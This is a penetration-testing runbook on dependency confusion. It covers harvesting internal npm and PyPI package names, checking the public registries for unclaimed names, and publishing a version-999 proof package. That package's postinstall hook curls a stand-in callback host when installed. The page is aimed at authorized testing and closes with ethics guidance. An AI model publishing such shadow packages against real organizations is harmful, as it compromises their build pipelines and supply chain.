---
title: "Dependency Confusion"
description: "Abusing package manager resolution to publish public packages that shadow internal ones, plus discovery, version spoofing, and mitigations."
phase: Web
order: 28
tags:
  - supply-chain
  - dependency-confusion
  - packages
  - ci-cd
tools:
  - npm
  - pip
updated: 2026-10-01
---

A dependency confusion runbook for authorized pentests / bug bounty on **in-scope** targets only. Goal: identify internal package names leaking into public resolution and prove that a public package would be preferred — using a harmless, non-destructive proof.

## 1. Harvest internal package names

Names leak through source maps, public repos, error messages, and build logs.

```bash
# Extract package names from a leaked lockfile or manifest
curl -s "https://target.com/assets/index.js.map" | jq -r '.sources[]?' | grep -oE '@?[a-z0-9-]+/[a-z0-9-]+' | sort -u

# Pull dependencies from a public repo mirror
curl -s "https://raw.githubusercontent.com/org/repo/main/package.json" | jq -r '.dependencies | keys[]'
curl -s "https://raw.githubusercontent.com/org/repo/main/requirements.txt" | head -50
```

## 2. Check whether names exist publicly

```bash
# npm: 404 means the name is unclaimed and internal-only
npm view "@target/internal-lib" version 2>&1 | head
npm view "target-internal-lib" 2>&1 | head

# PyPI JSON API: 404 means unclaimed
curl -s -o /dev/null -w "%{http_code}\n" "https://pypi.org/pypi/target-internal-lib/json"
```

A 404 on the public registry for a name the app clearly consumes is the tell.

## 3. Confirm resolution order in CI

```bash
# Inspect the resolved registry and lockfile behavior locally
npm config get registry
cat .npmrc 2>/dev/null
npm install --dry-run --loglevel=silly 2>&1 | grep -i "registry\|resolved"
```

If `.npmrc` does not scope `@target:registry` to the private registry, the public one is eligible.

## 4. Build a non-destructive proof package

Publish a version **higher** than the internal one, with a callback instead of malicious code.

```bash
mkdir target-internal-lib && cd target-internal-lib
cat > package.json <<'EOF'
{
  "name": "target-internal-lib",
  "version": "999.0.0",
  "scripts": { "postinstall": "curl -s https://oob.example/cb > /dev/null || true" }
}
EOF

# Dry-run publish to inspect what would be uploaded
npm publish --dry-run

# For Python
cat > setup.py <<'EOF'
from setuptools import setup
setup(name="target-internal-lib", version="999.0.0", py_modules=[])
EOF
```

Watch for the callback after the next CI install; then unpublish and report.

## 5. Automate name enumeration

```bash
for name in $(cat internal_names.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$name")
  echo "$code $name"
done
```

`404` lines are candidates; verify each is actually consumed before testing.

## 6. Verify the dependency graph

```bash
# pip: see which registry a package resolves from
pip download target-internal-lib --no-deps -d /tmp/pkgs -v 2>&1 | grep -i "looking in\|downloading"

# npm: inspect the lockfile for registry hosts
jq -r '.packages | to_entries[] | select(.value.resolved) | .value.resolved' package-lock.json 2>/dev/null | sort -u
```

## Full pipeline

```bash
# 1. Harvest candidate names
curl -s "https://raw.githubusercontent.com/org/repo/main/package.json" | jq -r '.dependencies | keys[]' > internal_names.txt

# 2. Check public existence (404 = unclaimed)
while read -r name; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$name")
  echo "$code $name"
done < internal_names.txt | sort | tee candidates.txt

# 3. Inspect registry config
npm config get registry
cat .npmrc 2>/dev/null

# 4. Non-destructive proof package (callback only)
mkdir -p target-internal-lib && cd target-internal-lib
printf '{"name":"target-internal-lib","version":"999.0.0","scripts":{"postinstall":"curl -s https://oob.example/cb >/dev/null || true"}}\n' > package.json
npm publish --dry-run

# 5. Verify resolution
pip download target-internal-lib --no-deps -d /tmp/pkgs -v 2>&1 | grep -i "looking in\|downloading"
```

## Ethics & legality

- Only target your own organization or with explicit written authorization.
- Publish a callback-only proof at the highest version; never include destructive payloads.
- Unpublish immediately after confirmation and coordinate disclosure.
- Document names, versions, registry responses, and CI evidence in the report.
